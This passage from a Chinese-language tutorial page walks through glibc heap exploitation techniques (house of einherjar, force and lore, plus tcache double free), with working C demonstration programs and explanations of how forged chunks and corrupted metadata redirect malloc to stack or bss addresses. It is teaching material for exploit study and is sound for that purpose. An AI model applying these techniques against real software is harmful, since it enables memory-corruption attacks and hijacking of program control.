class="hljs-type">size_t</span>) fake_chunk; <span class="hljs-comment">//fd_nextsize</span><br>    fake_chunk[<span class="hljs-number">5</span>] = (<span class="hljs-type">size_t</span>) fake_chunk; <span class="hljs-comment">//bk_nextsize</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;我们伪造的 fake chunk 在 %p\n&quot;</span>, fake_chunk);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;prev_size (not used): %#lx\n&quot;</span>, fake_chunk[<span class="hljs-number">0</span>]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;size: %#lx\n&quot;</span>, fake_chunk[<span class="hljs-number">1</span>]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fd: %#lx\n&quot;</span>, fake_chunk[<span class="hljs-number">2</span>]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;bk: %#lx\n&quot;</span>, fake_chunk[<span class="hljs-number">3</span>]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fd_nextsize: %#lx\n&quot;</span>, fake_chunk[<span class="hljs-number">4</span>]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;bk_nextsize: %#lx\n&quot;</span>, fake_chunk[<span class="hljs-number">5</span>]);<br><br>    b = (<span class="hljs-type">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xf8</span>);<br>    <span class="hljs-type">int</span> real_b_size = malloc_usable_size(b);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n再去申请 0xf8 chunk b.\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;chunk b 在: %p\n&quot;</span>, b);<br><br>    <span class="hljs-type">uint64_t</span>* b_size_ptr = (<span class="hljs-type">uint64_t</span>*)(b - <span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nb 的 size: %#lx\n&quot;</span>, *b_size_ptr);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b 的 大小是: 0x100，prev_inuse 有个 1，所以显示 0x101\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;假设有个 off by null 的漏洞，可以通过编辑 a 的时候把 b 的 prev_inuse 改成 0\n&quot;</span>);<br>    a[real_a_size] = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b 现在的 size: %#lx\n&quot;</span>, *b_size_ptr);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n我们伪造一个 prev_size 写到 a 的最后 %lu 个字节，以便 chunk b 与我们的 fake chunk 的合并\n&quot;</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>));<br>    <span class="hljs-type">size_t</span> fake_size = (<span class="hljs-type">size_t</span>)((b-<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>)*<span class="hljs-number">2</span>) - (<span class="hljs-type">uint8_t</span>*)fake_chunk);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n我们伪造的 prev_size 将会是 chunk b 的带 chunk 头的地址 %p - fake_chunk 的地址 %p = %#lx\n&quot;</span>, b-<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>)*<span class="hljs-number">2</span>, fake_chunk, fake_size);<br>    *(<span class="hljs-type">size_t</span>*)&amp;a[real_a_size-<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>)] = fake_size;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n接下来要把 fake chunk 的 size 改掉，来通过 size(P) == prev_size(next_chunk(P)) 检查\n&quot;</span>);<br>    fake_chunk[<span class="hljs-number">1</span>] = fake_size;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nfree b，首先会跟 top chunk 合并，然后因为 b 的 prev_size 是 0，所以会跟前面的 fake chunk 合并，glibc 寻找空闲块的方法是 chunk_at_offset(p, -((long) prevsize))，这样算的话 b+fake_prev_size 得到 fake chunk 的地址，然后合并到 top chunk，新的 topchunk 的起点就是 fake chunk，再次申请就会从 top chunk 那里申请\n&quot;</span>);<br>    <span class="hljs-built_in">free</span>(b);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;现在 fake chunk 的 size 是 %#lx (b.size + fake_prev_size)\n&quot;</span>, fake_chunk[<span class="hljs-number">1</span>]);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n现在如果去 malloc，他就会申请到伪造的那个 chunk\n&quot;</span>);<br>    d = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x200</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;malloc(0x200) 在 %p\n&quot;</span>, d);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>先在栈上伪造一个chunk(从presize到bk_nextsize全部填0x100)，然后把第二个堆块的pre_inuse修改为0（与fake_chunk合并）。这里利用了寻找空闲块的函数</p><blockquote><p>chunk_at_offset(p, -((long) prevsize))</p></blockquote><p>所以只要presize位写成第二个 堆的地址 - fake_chunk的地址，这样识别出来的上一个空闲块的位置就是fake_chunk。</p><blockquote><p>这里还要把fake_chunk的size位写为我们要修改的fake_size以通过检测</p></blockquote><p>此时free 第二个堆块，它先与top_chunk合并，随后通过寻址找到fake_chunk与fake_chunk合并（此时top_chunk新地址为fake_chunk的地址）</p><p>这时候再申请一个新的堆块，就会从新的top_chunk开始切割，于是就申请到了栈上。</p><h3 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house_of_force"></a>house_of_force</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span></span><br><br><span class="hljs-type">char</span> bss_var[] = <span class="hljs-string">&quot;This is a string that we want to overwrite.&quot;</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc , <span class="hljs-type">char</span>* argv[])</span><br>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\n欢迎学习 House of Force\n\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;House of Force 这种方法是去覆写 top chunk 这样 malloc 的时候就可以 malloc 到任意地址\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;top chunk 是一类特殊的 chunk，在内存最后面。并且是当 malloc 向操作系统请求更多空间时将调整大小的块。\n&quot;</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\n最后我们会覆盖这个变量 %p.\n&quot;</span>, bss_var);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在变量值是：%s\n&quot;</span>, bss_var);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\n先分配一个 chunk.\n&quot;</span>);<br>    <span class="hljs-type">intptr_t</span> *p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">256</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;malloc(256) 的地址： %p.\n&quot;</span>, p1 - <span class="hljs-number">2</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\n现在有两块，一个我们申请的，一个 top chunk.\n&quot;</span>);<br>    <span class="hljs-type">int</span> real_size = malloc_usable_size(p1);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;我们申请的 chunk 加上 chunk 头，大小是：%ld.\n&quot;</span>, real_size + <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>)*<span class="hljs-number">2</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\n现在假设有一个漏洞，可以覆盖掉 top chunk 的头部分\n&quot;</span>);<br><br>    <span class="hljs-type">intptr_t</span> *ptr_top = (<span class="hljs-type">intptr_t</span> *) ((<span class="hljs-type">char</span> *)p1 + real_size - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>));<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\ntop chunk 起始地址是：%p\n&quot;</span>, ptr_top);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\n用一个很大的值覆盖掉 top chunk 的 size 位可以防止 malloc 调用 mmap\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;top chunk 之前的 size：%#llx\n&quot;</span>, *((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> *)((<span class="hljs-type">char</span> *)ptr_top + <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>))));<br>    *(<span class="hljs-type">intptr_t</span> *)((<span class="hljs-type">char</span> *)ptr_top + <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>)) = <span class="hljs-number">-1</span>;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;top chunk 现在的 size：%#llx\n&quot;</span>, *((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> *)((<span class="hljs-type">char</span> *)ptr_top + <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>))));<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\n因为现在 top chunk 的 size 是很大的，所以我们可以调用 malloc 而不会调用 mmap\n&quot;</span>);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * The evil_size is calulcated as (nb is the number of bytes requested + space for metadata):</span><br><span class="hljs-comment">     * new_top = old_top + nb</span><br><span class="hljs-comment">     * nb = new_top - old_top</span><br><span class="hljs-comment">     * req + 2sizeof(long) = new_top - old_top</span><br><span class="hljs-comment">     * req = new_top - old_top - 2sizeof(long)</span><br><span class="hljs-comment">     * req = dest - 2sizeof(long) - old_top - 2sizeof(long)</span><br><span class="hljs-comment">     * req = dest - old_top - 4*sizeof(long)</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> evil_size = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)bss_var - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>)*<span class="hljs-number">4</span> - (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)ptr_top;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\n我们想把数据写在这里：%p, top chunk 在：%p, 还要把 chunk 头算进去,我们将要申请 %#lx 字节.\n&quot;</span>, bss_var, ptr_top, evil_size);<br>    <span class="hljs-type">void</span> *new_ptr = <span class="hljs-built_in">malloc</span>(evil_size);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;新申请的 chunk 将会与之前的 top chunk 在同一个位置: %p\n&quot;</span>, new_ptr - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>)*<span class="hljs-number">2</span>);<br><br>    <span class="hljs-type">void</span>* ctr_chunk = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">100</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\n接下来再申请 chunk 的话将会指向我们想要修改的地方\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;malloc(100) =&gt; %p!\n&quot;</span>, ctr_chunk);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在我们就可以控制 bss_var 这块地方的值了\n&quot;</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;... 之前内容是: %s\n&quot;</span>, bss_var);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;... 接下来把 \&quot;YEAH!!!\&quot; 写到那里...\n&quot;</span>);<br>    <span class="hljs-built_in">strcpy</span>(ctr_chunk, <span class="hljs-string">&quot;YEAH!!!&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;... 新的内容: %s\n&quot;</span>, bss_var);<br>    <span class="hljs-comment">// some further discussion:</span><br>    <span class="hljs-comment">//fprintf(stderr, &quot;This controlled malloc will be called with a size parameter of evil_size = malloc_got_address - 8 - p2_guessed\n\n&quot;);</span><br>    <span class="hljs-comment">//fprintf(stderr, &quot;This because the main_arena-&gt;top pointer is setted to current av-&gt;top + malloc_size &quot;</span><br>    <span class="hljs-comment">//  &quot;and we \nwant to set this result to the address of malloc_got_address-8\n\n&quot;);</span><br>    <span class="hljs-comment">//fprintf(stderr, &quot;In order to do this we have malloc_got_address-8 = p2_guessed + evil_size\n\n&quot;);</span><br>    <span class="hljs-comment">//fprintf(stderr, &quot;The av-&gt;top after this big malloc will be setted in this way to malloc_got_address-8\n\n&quot;);</span><br>    <span class="hljs-comment">//fprintf(stderr, &quot;After that a new call to malloc will return av-&gt;top+8 ( +8 bytes for the header ),&quot;</span><br>    <span class="hljs-comment">//  &quot;\nand basically return a chunk at (malloc_got_address-8)+8 = malloc_got_address\n\n&quot;);</span><br><br>    <span class="hljs-comment">//fprintf(stderr, &quot;The large chunk with evil_size has been allocated here 0x%08x\n&quot;,p2);</span><br>    <span class="hljs-comment">//fprintf(stderr, &quot;The main_arena value av-&gt;top has been setted to malloc_got_address-8=0x%08x\n&quot;,malloc_got_address);</span><br><br>    <span class="hljs-comment">//fprintf(stderr, &quot;This last malloc will be served from the remainder code and will return the av-&gt;top+8 injected before\n&quot;);</span><br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>先申请一个chunk去控制top_chunk的size位（改为0xffffffffffff），此时申请一个很大的chunk亦不会调用mmap。然后把去申请一个evil_size的大小的chunk，把top_chunk控制到bss_addr上（这个chunk与之前top_chunk处于同一位置），这个时候再一次申请一个chunk就能把chunk申请到目标地址上</p><blockquote><p>evil_size&#x3D;dest - old_top - 4*sizeof(long)&#x3D;dest - old_top -0x20</p></blockquote><h3 id="house-of-lore"><a href="#house-of-lore" class="headerlink" title="house_of_lore"></a>house_of_lore</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">jackpot</span><span class="hljs-params">()</span>&#123; <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Nice jump d00d\n&quot;</span>); <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>); &#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> * argv[])</span>&#123;<br><br>  <span class="hljs-type">intptr_t</span>* stack_buffer_1[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>  <span class="hljs-type">intptr_t</span>* stack_buffer_2[<span class="hljs-number">3</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;定义了两个数组&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_buffer_1 在 %p\n&quot;</span>, (<span class="hljs-type">void</span>*)stack_buffer_1);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_buffer_2 在 %p\n&quot;</span>, (<span class="hljs-type">void</span>*)stack_buffer_2);<br><br>  <span class="hljs-type">intptr_t</span> *victim = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">100</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;申请第一块属于 fastbin 的 chunk 在 %p\n&quot;</span>, victim);<br>  <span class="hljs-type">intptr_t</span> *victim_chunk = victim<span class="hljs-number">-2</span>;<span class="hljs-comment">//chunk 开始的位置</span><br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;在栈上伪造一块 fake chunk\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;设置 fd 指针指向 victim chunk，来绕过 small bin 的检查，这样的话就能把堆栈地址放在到 small bin 的列表上\n&quot;</span>);<br>  stack_buffer_1[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>  stack_buffer_1[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>  stack_buffer_1[<span class="hljs-number">2</span>] = victim_chunk;<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;设置 stack_buffer_1 的 bk 指针指向 stack_buffer_2，设置 stack_buffer_2 的 fd 指针指向 stack_buffer_1 来绕过最后一个 malloc 中 small bin corrupted, 返回指向栈上假块的指针&quot;</span>);<br>  stack_buffer_1[<span class="hljs-number">3</span>] = (<span class="hljs-type">intptr_t</span>*)stack_buffer_2;<br>  stack_buffer_2[<span class="hljs-number">2</span>] = (<span class="hljs-type">intptr_t</span>*)stack_buffer_1;<br><br>  <span class="hljs-type">void</span> *p5 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;另外再分配一块，避免与 top chunk 合并 %p\n&quot;</span>, p5);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Free victim chunk %p, 他会被插入到 fastbin 中\n&quot;</span>, victim);<br>  <span class="hljs-built_in">free</span>((<span class="hljs-type">void</span>*)victim);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\n此时 victim chunk 的 fd、bk 为零\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;victim-&gt;fd: %p\n&quot;</span>, (<span class="hljs-type">void</span> *)victim[<span class="hljs-number">0</span>]);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="hljs-type">void</span> *)victim[<span class="hljs-number">1</span>]);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;这时候去申请一个 chunk，触发 fastbin 的合并使得 victim 进去 unsortedbin 中处理，最终被整理到 small bin 中 %p\n&quot;</span>, victim);<br>  <span class="hljs-type">void</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1200</span>);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在 victim chunk 的 fd 和 bk 更新为 unsorted bin 的地址\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;victim-&gt;fd: %p\n&quot;</span>, (<span class="hljs-type">void</span> *)victim[<span class="hljs-number">0</span>]);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="hljs-type">void</span> *)victim[<span class="hljs-number">1</span>]);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在模拟一个可以覆盖 victim 的 bk 指针的漏洞，让他的 bk 指针指向栈上\n&quot;</span>);<br>  victim[<span class="hljs-number">1</span>] = (<span class="hljs-type">intptr_t</span>)stack_buffer_1;<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;然后申请跟第一个 chunk 大小一样的 chunk\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;他应该会返回 victim chunk 并且它的 bk 为修改掉的 victim 的 bk\n&quot;</span>);<br>  <span class="hljs-type">void</span> *p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">100</span>);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;最后 malloc 一次会返回 victim-&gt;bk 指向的那里\n&quot;</span>);<br>  <span class="hljs-type">char</span> *p4 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">100</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;p4 = malloc(100)\n&quot;</span>);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\n在最后一个 malloc 之后，stack_buffer_2 的 fd 指针已更改 %p\n&quot;</span>,stack_buffer_2[<span class="hljs-number">2</span>]);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\np4 在栈上 %p\n&quot;</span>, p4);<br>  <span class="hljs-type">intptr_t</span> sc = (<span class="hljs-type">intptr_t</span>)jackpot;<br>  <span class="hljs-built_in">memcpy</span>((p4+<span class="hljs-number">40</span>), &amp;sc, <span class="hljs-number">8</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>先是在栈上伪造了两个chunk，p1的fd指向victim_chunk，bk指向p2，而p2的fd指向p1。（为了绕过small_bins的检测）</p><blockquote><p>p1-&gt;fd&#x3D;victim_chunk，p1-&gt;bk&#x3D;p2，p2-&gt;fd&#x3D;p1</p></blockquote><p>随后申请了一块chunk防止合并，再去free victim_chunk。</p><p>这时申请一个比较大的chunk把victim_chunk放入small_bins（fd，bk都指向main_arean+88），然后利用漏洞去修改victim_chunk的bk指针为p1。</p><p>随后去申请一个与victim_chunk初始大小一样大的chunk就会把victim_chunk申请回来，再申请一次就把chunk申请到了p1的位置（此时p2的fd指针会指向main_arean+88，这是因为small_bins链表中只剩p2一个chunk）</p><h2 id="glibc-2-27"><a href="#glibc-2-27" class="headerlink" title="glibc_2.27"></a>glibc_2.27</h2><h3 id="tcache-dup"><a href="#tcache-dup" class="headerlink" title="tcache_dup"></a>tcache_dup</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;先申请一块内存\n&quot;</span>);<br><span class="hljs-type">int</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;申请的内存地址是: %p\n&quot;</span>, a);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;对这块内存地址 free两次\n&quot;</span>);<br><span class="hljs-built_in">free</span>(a);<br><span class="hljs-built_in">free</span>(a);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;这时候链表是这样的 [ %p, %p ].\n&quot;</span>, a, a);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;接下来再去 malloc 两次: [ %p, %p ].\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>), <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>));<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;ojbk\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>在2.27版本，tcache是没有double_free检测的，所以直接double_free就可以</p><h3 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" 